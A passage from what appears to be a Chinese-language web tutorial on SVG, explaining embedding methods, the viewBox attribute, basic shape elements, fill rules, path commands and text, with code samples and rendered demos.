元素。<br>　　SVG 代码以<code>&lt;svg&gt;</code>元素开始，包括开启标签<code>&lt;svg&gt;</code>和关闭标签<code>&lt;/svg&gt;</code>。这是根元素。width 和 height 属性可设置此 SVG 文档的宽度和高度。version 属性可定义所使用的 SVG 版本，xmlns 属性可定义 SVG 命名空间。<br>　　stroke 和 stroke-width 属性控制如何显示形状的轮廓。fill 属性设置形状内的颜色。<br>　　<em>注释：所有的开启标签必须有关闭标签！</em></p><h2 id="三、页面中使用SVG"><a href="#三、页面中使用SVG" class="headerlink" title="三、页面中使用SVG"></a>三、页面中使用SVG</h2><ol><li>SVG可以直接嵌入到HTML页面中使用</li><li>SVG代码也可以写在一个独立文件中，然后用<code>&lt;img&gt;、&lt;object&gt;、&lt;embed&gt;、&lt;iframe&gt;</code>等标签插入网页</li><li>CSS 也可以使用 SVG 文件</li><li><p>SVG 文件还可以转为 BASE64 编码，然后作为 Data URI 写入网页。</p><p> eg:</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 直接在html中写SVG代码 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span></span></span><br><span class="line"><span class="tag"><span class="attr">id</span>=<span class="string">"mysvg"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span></span></span><br><span class="line"><span class="tag"><span class="attr">viewBox</span>=<span class="string">"0 0 800 600"</span></span></span><br><span class="line"><span class="tag"><span class="attr">preserveAspectRatio</span>=<span class="string">"xMidYMid meet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">circle</span> <span class="attr">id</span>=<span class="string">"mycircle"</span> <span class="attr">cx</span>=<span class="string">"400"</span> <span class="attr">cy</span>=<span class="string">"300"</span> <span class="attr">r</span>=<span class="string">"50"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 通过标签引入SVG --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"circle.svg"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">id</span>=<span class="string">"object"</span> <span class="attr">data</span>=<span class="string">"circle.svg"</span> <span class="attr">type</span>=<span class="string">"image/svg+xml"</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;object&gt;:</span></span><br><span class="line"><span class="comment">优势：所有主要浏览器都支持，并支持HTML4，XHTML和HTML5标准</span></span><br><span class="line"><span class="comment">缺点：不允许使用脚本。 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">id</span>=<span class="string">"embed"</span> <span class="attr">src</span>=<span class="string">"icon.svg"</span> <span class="attr">type</span>=<span class="string">"image/svg+xml"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;embed&gt;:</span></span><br><span class="line"><span class="comment">优势：所有主要浏览器都支持，并允许使用脚本</span></span><br><span class="line"><span class="comment">缺点：不推荐在HTML4和XHTML中使用（但在HTML5允许） --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"icon.svg"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;iframe&gt;:</span></span><br><span class="line"><span class="comment">优势：所有主要浏览器都支持，并允许使用脚本</span></span><br><span class="line"><span class="comment">缺点：不推荐在HTML4和XHTML中使用（但在HTML5允许） --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- css中引入SVG --&gt;</span></span><br><span class="line">.logo &#123;</span><br><span class="line">background: url(icon.svg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 转为 BASE64 编码引入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"data:image/svg+xml;base64,[data]"</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="四、语法"><a href="#四、语法" class="headerlink" title="四、语法"></a>四、语法</h2><p><strong>SVG Shapes</strong><br>SVG有一些预定义的形状元素，可被开发者使用和操作：  </p><ul><li>矩形 <code>&lt;rect&gt;</code></li><li>圆形 <code>&lt;circle&gt;</code></li><li>椭圆 <code>&lt;ellipse&gt;</code></li><li>线 <code>&lt;line&gt;</code></li><li>折线 <code>&lt;polyline&gt;</code></li><li>多边形 <code>&lt;polygon&gt;</code></li><li>路径 <code>&lt;path&gt;</code></li></ul><ol><li><p><code>&lt;svg&gt;</code>标签<br> SVG 代码都放在顶层标签<code>&lt;svg&gt;</code>之中。  </p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">viewBox</span>=<span class="string">"50 50 50 50"</span>&gt;</span> </span><br><span class="line">    <span class="comment">&lt;!-- svg stuff here --&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;svg&gt;</code>的width属性和height属性，指定了 SVG 图像在 HTML 元素中所占据的宽度和高度。除了相对单位，也可以采用绝对单位（单位：像素）。如果不指定这两个属性，SVG 图像默认大小是300像素（宽） x 150像素（高）。<br>如果只想展示 SVG 图像的一部分，就要指定viewBox属性。</li><li><p><code>View box</code>——这个值允许我们指定一组图像伸展开来适应一个特定的容器元素。<code>viewBox</code>属性的值是一个包含四个数字的列表。min-x,min-y,width,height。 <code>viewBox</code>属性的四个值，分别是左上角的横坐标和纵坐标、视口的宽度和高度。下面代码中，SVG 图像是100像素宽 x 100像素高，viewBox属性指定视口从(50, 50)这个点开始。所以，实际看到的是右下角的四分之一圆。</p></li><li><p>注意，视口必须适配所在的空间。下面代码中，视口的大小是 50 x 50，由于 SVG 图像的大小是 100 x 100，所以视口会放大去适配 SVG 图像的大小，即放大了四倍。</p></li><li><p>如果不指定width属性和height属性，只指定viewBox属性，则相当于只给定 SVG 图像的长宽比。这时，SVG 图像的默认大小将等于所在的 HTML 元素的大小。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">viewBox</span>=<span class="string">"50 50 50 50"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">circle</span> <span class="attr">id</span>=<span class="string">"mycircle"</span> <span class="attr">cx</span>=<span class="string">"50"</span> <span class="attr">cy</span>=<span class="string">"50"</span> <span class="attr">r</span>=<span class="string">"50"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>&lt;rect&gt;</code> 标签<br> <code>&lt;rect&gt;</code>标签用于绘制矩形。</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"120"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span> <span class="attr">x</span>=<span class="string">"10"</span> <span class="attr">y</span>=<span class="string">"10"</span> <span class="attr">rx</span>=<span class="string">"20"</span> <span class="attr">ry</span>=<span class="string">"20"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">width</span>=<span class="string">"200"</span> <span class="attr">style</span>=<span class="string">"stroke: #70d5dd; stroke-width: 3px; fill: #dd524b; fill-opacity:0.1; stroke-opacity:0.9; opacity:0.5;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>x</code> —— 指定了矩形左上角端点的横坐标；</li><li><code>y</code> —— 指定了矩形左上角端点的纵坐标；</li><li><code>rx</code> —— 用于指定圆角x轴的弧度；</li><li><code>ry</code> —— 用于指定圆角y轴的弧度；</li><li><code>width</code> —— 属性指定了矩形的宽度（单位像素）；</li><li><code>height</code> —— 属性指定了矩形的高度（单位像素）; </li><li>CSS属性<ul><li><code>fill</code> —— CSS属性定义矩形的填充颜色（rgb 值、颜色名或者十六进制值）；</li><li><code>stroke-width</code> 属性定义矩形边框的宽度；</li><li><code>stroke</code> —— 属性定义矩形边框的颜色;</li><li><code>fill-opacity</code> —— 属性定义填充颜色透明度（合法的范围是：0 - 1）；</li><li><code>stroke-opacity</code> —— 属性定义轮廓颜色的透明度（合法的范围是：0 - 1）；</li><li><code>opacity</code> —— 属性用于定义了元素的透明值 (范围: 0 到 1)；<div style="width: 300px; height: 150px; margin: 15px 0; border: 1px solid #ff0000;"><br>  <svg width="300" height="180"><br/>      <rect x="10" y="10" rx="20" ry="20" height="100" width="200" style="stroke: #9AFF02; stroke-width: 3px; fill: red; fill-opacity:0.9; stroke-opacity:0.9; opacity:0.5;"/><br/>  </svg><br></div></li></ul></li></ul></li><li><p><code>&lt;circle&gt;</code>标签<br> <code>&lt;circle&gt;</code>标签用于绘制圆形</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">"50"</span> <span class="attr">cy</span>=<span class="string">"50"</span> <span class="attr">r</span>=<span class="string">"25"</span> <span class="attr">style</span>=<span class="string">"stroke: #9AFF02; stroke-width: 3px; fill: red;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>cx</code> —— 定义圆点的x坐标（单位为像素）；</li><li><code>cy</code> —— 定义圆点的y坐标 （单位为像素）；</li><li><code>r</code> —— 半径 （单位为像素）；<br><em>坐标都是相对于<code>&lt;svg&gt;</code>画布的左上角原点。</em><div style="width: 300px; height: 150px; margin: 15px 0; border: 1px solid #ff0000;"><br>  <svg width="300" height="180"><br/>      <circle cx="50" cy="50" r="25" style="stroke: #9AFF02; stroke-width: 3px; fill: red;"/><br/>  </svg><br></div></li></ul></li><li><p><code>&lt;ellipse&gt;</code>标签<br> <code>&lt;ellipse&gt;</code>标签用于绘制椭圆</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ellipse</span> <span class="attr">cx</span>=<span class="string">"60"</span> <span class="attr">cy</span>=<span class="string">"60"</span> <span class="attr">ry</span>=<span class="string">"40"</span> <span class="attr">rx</span>=<span class="string">"20"</span> <span class="attr">stroke</span>=<span class="string">"#9AFF02"</span> <span class="attr">stroke-width</span>=<span class="string">"3"</span> <span class="attr">fill</span>=<span class="string">"red"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>cx</code> —— 定义椭圆中心的x坐标</li><li><code>cy</code> —— 定义椭圆中心的y坐标</li><li><code>rx</code> —— 定义椭圆的水平半径</li><li><code>ry</code> —— 定义椭圆的垂直半径<div style="width: 300px; height: 150px; margin: 15px 0; border: 1px solid #ff0000;"><br>  <svg width="300" height="180"><br/>      <ellipse cx="60" cy="60" ry="40" rx="20" stroke="#9AFF02" stroke-width="3" fill="red"/><br/>  </svg><br></div></li></ul></li><li><p><code>&lt;line&gt;</code>标签<br><code>&lt;line&gt;</code>标签用来绘制直线</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">line</span> <span class="attr">x1</span>=<span class="string">"10"</span> <span class="attr">y1</span>=<span class="string">"50"</span> <span class="attr">x2</span>=<span class="string">"100"</span> <span class="attr">y2</span>=<span class="string">"50"</span> <span class="attr">style</span>=<span class="string">"stroke:#9AFF02;stroke-width:3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>x1</code> —— 定义线段起点的横坐标</li><li><code>y1</code> —— 定义线段起点的纵坐标</li><li><code>x2</code> —— 定义线段终点的横坐标</li><li><code>y2</code> —— 定义线段终点的纵坐标<div style="width: 300px; height: 150px; margin: 15px 0; border: 1px solid #ff0000;"><br>   <svg width="300" height="180"><br/>       <line x1="10" y1="50" x2="100" y2="50" style="stroke:#9AFF02;stroke-width:3"/><br/>   </svg><br></div></li></ul></li><li><p><code>&lt;polyline&gt;</code>标签<br> <code>&lt;polyline&gt;</code>标签用于绘制一根折线</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">polyline</span> <span class="attr">points</span>=<span class="string">"20,20 60,40 80,90 150,50 200,130"</span> <span class="attr">style</span>=<span class="string">"fill:none;stroke:#9AFF02;stroke-width:3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>points</code> —— 属性指定了每个端点的坐标x、y，x坐标与y坐标之间与逗号分隔，点与点之间用空格分隔。<div style="width: 300px; height: 150px; margin: 15px 0; border: 1px solid #ff0000;"><br>  <svg xmlns="http://www.w3.org/2000/svg" version="1.1"><br/>      <polyline points="20,20 60,40 80,90 150,50 200,130" style="fill:none;stroke:#9AFF02;stroke-width:3"/><br/>  </svg><br></div></li></ul></li><li><p><code>&lt;polygon&gt;</code>标签<br> <code>&lt;polygon&gt;</code>标签用于绘制多边形</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">polygon</span> <span class="attr">fill</span>=<span class="string">"green"</span> <span class="attr">stroke</span>=<span class="string">"orange"</span> <span class="attr">stroke-width</span>=<span class="string">"1"</span> <span class="attr">points</span>=<span class="string">"0,0 100,0 100,100 0,100 0,0"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>points</code> —— 属性指定了每个端点的坐标x、y，x坐标与y坐标之间与逗号分隔，点与点之间用空格分隔。</li><li><p><code>fill-rule</code> —— 确定一个形状的“内部”，有效值: <code>nonzero | evenodd | inherit</code> :</p><ul><li><p><code>nonzero</code>字面意思是“非零”。按该规则，要判断一个点是否在图形内，从该点作任意方向的一条射线，然后检测射线与图形路径的交点情况。从0开始计数，路径从左向右穿过射线则计数加1，从右向左穿过射线则计数减1。得出计数结果后，如果结果是0，则认为点在图形外部，否则认为在内部  </p><svg width="12cm" height="4cm" viewbox="0 0 1200 400" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><br/>  <desc>Example fillrule-nonzero - demonstrates fill-rule:nonzero</desc><br/>  <rect x="1" y="1" width="1198" height="398" fill="none" stroke="blue"/><br/>  <defs><br/>      <path id="Triangle" d="M 16,0 L -8,9 v-18 z" fill="black" stroke="none"/><br/>  </defs><br/>  <g fill-rule="nonzero" fill="red" stroke="black" stroke-width="3"><br/>      <path d="M 250,75 L 323,301 131,161 369,161 177,301 z"/><br/>      <use xlink:href="#Triangle" transform="translate(306.21 249) rotate(72)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(175.16,193.2) rotate(216)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(314.26,161) rotate(0)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(221.16,268.8) rotate(144)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(233.21,126.98) rotate(288)" overflow="visible"/><br/>      <path d="M 600,81 A 107,107 0 0,1 600,295 A 107,107 0 0,1 600,81 z              M 600,139 A 49,49 0 0,1 600,237 A 49,49 0 0,1 600,139 z"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(0) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(120) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(240) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(60) translate(49,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(180) translate(49,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(300) translate(49,0) rotate(90)" overflow="visible"/><br/>      <path d="M 950,81 A 107,107 0 0,1 950,295 A 107,107 0 0,1 950,81 z              M 950,139 A 49,49 0 0,0 950,237 A 49,49 0 0,0 950,139 z"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(0) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(120) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(240) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(60) translate(49,0) rotate(-90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(180) translate(49,0) rotate(-90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(300) translate(49,0) rotate(-90)" overflow="visible"/><br/>  </g><br/></svg></li><li><p><code>evenodd</code>字面意思是“奇偶”。按该规则，要判断一个点是否在图形内，从该点作任意方向的一条射线，然后检测射线与图形路径的交点的数量。如果结果是奇数则认为点在内部，是偶数则认为点在外部  </p><svg width="12cm" height="4cm" viewbox="0 0 1200 400" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><br/>  <desc>Example fillrule-evenodd - demonstrates fill-rule:evenodd</desc><br/>  <rect x="1" y="1" width="1198" height="398" fill="none" stroke="blue"/><br/>  <defs><br/>      <path id="Triangle" d="M 16,0 L -8,9 v-18 z" fill="black" stroke="none"/><br/>  </defs><br/>  <g fill-rule="evenodd" fill="red" stroke="black" stroke-width="3"><br/>      <path d="M 250,75 L 323,301 131,161 369,161 177,301 z"/><br/>      <use xlink:href="#Triangle" transform="translate(306.21 249) rotate(72)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(175.16,193.2) rotate(216)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(314.26,161) rotate(0)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(221.16,268.8) rotate(144)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(233.21,126.98) rotate(288)" overflow="visible"/><br/>      <path d="M 600,81 A 107,107 0 0,1 600,295 A 107,107 0 0,1 600,81 z              M 600,139 A 49,49 0 0,1 600,237 A 49,49 0 0,1 600,139 z"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(0) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(120) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(240) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(60) translate(49,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(180) translate(49,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(600,188) rotate(300) translate(49,0) rotate(90)" overflow="visible"/><br/>      <path d="M 950,81 A 107,107 0 0,1 950,295 A 107,107 0 0,1 950,81 z              M 950,139 A 49,49 0 0,0 950,237 A 49,49 0 0,0 950,139 z"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(0) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(120) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(240) translate(107,0) rotate(90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(60) translate(49,0) rotate(-90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(180) translate(49,0) rotate(-90)" overflow="visible"/><br/>      <use xlink:href="#Triangle" transform="translate(950,188) rotate(300) translate(49,0) rotate(-90)" overflow="visible"/><br/>  </g><br/></svg><p>更多案例：<a href="http://www.runoob.com/svg/svg-polygon.html" target="_blank" rel="noopener">http://www.runoob.com/svg/svg-polygon.html</a></p><div style="width: 500px; height: 200px; margin: 15px 0; border: 1px solid #ff0000;"><br>  <svg width="200" height="180" style="float:left;"><br/>  <polygon points="100,10 40,180 190,60 10,60 160,180" style="fill:lime;stroke:purple;stroke-width:5;fill-rule:nonzero;"/><br/>  </svg><br>  <svg width="200" height="180" style="float:left;"><br/>  <polygon points="100,10 40,180 190,60 10,60 160,180" style="fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;"/><br/>  </svg><br></div></li></ul></li></ul></li><li><p><code>&lt;path&gt;</code>标签<br> <code>&lt;path&gt;</code>标签用于制路径</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">    M 18,3</span></span></span><br><span class="line"><span class="tag"><span class="string">    L 46,3</span></span></span><br><span class="line"><span class="tag"><span class="string">    L 46,40</span></span></span><br><span class="line"><span class="tag"><span class="string">    L 61,40</span></span></span><br><span class="line"><span class="tag"><span class="string">    L 32,68</span></span></span><br><span class="line"><span class="tag"><span class="string">    L 3,40</span></span></span><br><span class="line"><span class="tag"><span class="string">    L 18,40</span></span></span><br><span class="line"><span class="tag"><span class="string">    Z</span></span></span><br><span class="line"><span class="tag"><span class="string">    "</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>M = moveto</code></li><li><code>L = lineto</code></li><li><code>H = horizontal lineto</code></li><li><code>V = vertical lineto</code></li><li><code>C = curveto</code></li><li><code>S = smooth curveto</code></li><li><code>Q = quadratic Bézier curve</code></li><li><code>T = smooth quadratic Bézier curveto</code></li><li><code>A = elliptical Arc</code></li><li><p><code>Z = closepath</code></p><p>| 指令 | 参数 | 描述 |<br>|:—-|:—-|:—-|<br>|  M  | x y | 起始点坐标x y （Move to） |<br>|  L  | x y | 冲当前点的坐标画直线到指定点的x y坐标（Line to） |<br>|  H  |  x  | 从当前点的坐标画水平直线到指定的x轴坐标（Horizontal line to） |<br>|  V  |  y  | 从当前点的坐标画垂直直线到指定的y轴坐标（Vertical line to） |<br>|  C  | x1 y1 x2 y2 x y | 从当前点的坐标画条贝塞尔线到指定点的x y坐标，其中x1 y1及x2,y2为控制点（Curve） |<br>|  S  | x2 y2 x y | 从当前点的坐标画条反射的贝塞曲线到指定点的x, y坐标，其中x2, y2为反射的控制点（Smooth curve） |<br>|  Q  | x2 y2 x y | 从当前点的坐标画条反射的贝塞曲线到指定点的x, y坐标，其中x2, y2为反射的控制点（Smooth curve） |<br>|  T  | x y | 从当前点的坐标画条反射二次贝塞曲线到指定点的x, y坐标，以前一个坐标为反射控制点（Smooth Quadratic Bézier curve） |<br>|  A  | rx ry x-axis-rotation large-arc-flag sweep-flag x y | 从当前点的坐标画个椭圆形到指定点的x, y坐标，其中rx, ry为椭圆形的x轴及y轴的半径，x-axis-rotation是弧线与x轴的旋转角度，large-arc-flag则设定1最大角度的弧线或是0最小角度的弧线，sweep-flag设定方向为1顺时针方向或0逆时针方向（Arc） |<br>|  Z  |      | 关闭路径，将当前点坐标与第一个点的坐标连接起来（Closepath） |</p><p><em>注意：以上所有命令均允许小写字母。大写代表绝对坐标，小写代表与前一个坐标的相对座标。</em></p><svg width="300" height="180" fill="red"><br/>   <path d="   M 18,3   L 46,3   L 46,40   L 61,40   L 32,68   L 3,40   L 18,40   Z   "/><br/></svg></li></ul></li><li><p><code>&lt;text&gt;</code> 标签<br> <code>&lt;text&gt;</code>标签用于绘制文本  </p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">"50"</span> <span class="attr">y</span>=<span class="string">"25"</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">    ```  </span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span> <span class="attr">fill</span>=<span class="string">"red"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span 